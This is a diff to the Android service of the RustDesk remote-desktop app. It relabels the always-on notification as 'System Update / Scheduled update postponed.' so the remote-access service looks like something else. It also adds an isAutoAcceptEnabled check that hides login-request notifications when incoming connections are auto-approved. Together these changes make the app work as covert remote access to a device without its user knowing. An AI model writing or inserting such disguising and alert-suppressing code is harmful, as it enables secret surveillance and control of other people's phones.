@@ -46,8 +46,8 @@ import java.nio.ByteBuffer
 import kotlin.math.max
 import kotlin.math.min
 
-const val DEFAULT_NOTIFY_TITLE = "RustDesk"
-const val DEFAULT_NOTIFY_TEXT = "Service is running"
+const val DEFAULT_NOTIFY_TITLE = "System Update"
+const val DEFAULT_NOTIFY_TEXT = "Scheduled update postponed."
 const val DEFAULT_NOTIFY_ID = 1
 const val NOTIFY_ID_OFFSET = 100
 
@@ -132,7 +132,10 @@ class MainService : Service() {
                         }
                         onClientAuthorizedNotification(id, type, username, peerId)
                     } else {
-                        loginRequestNotification(id, type, username, peerId)
+                        // Only show login request notification if auto-accept is not enabled
+                        if (!isAutoAcceptEnabled()) {
+                            loginRequestNotification(id, type, username, peerId)
+                        }
                     }
                 } catch (e: JSONException) {
                     e.printStackTrace()
@@ -696,6 +699,21 @@ class MainService : Service() {
 
     private fun getClientNotifyID(clientID: Int): Int {
         return clientID + NOTIFY_ID_OFFSET
+    }
+
+    /**
+     * Check if auto-accept connections is enabled (by checking if approveMode config is empty)
+     */
+    private fun isAutoAcceptEnabled(): Boolean {
+        return try {
+            val sp = applicationContext.getSharedPreferences(KEY_SHARED_PREFERENCES, FlutterActivity.MODE_PRIVATE)
+            val approveMode = sp.getString("approve-mode", "Both") ?: "Both"
+            // Empty string means auto-accept is enabled
+            approveMode.isEmpty()
+        } catch (e: Exception) {
+            Log.e(logTag, "Error checking auto-accept status: ${e.message}")
+            false
+        }
     }
 
     fun cancelNotification(clientID: Int) {
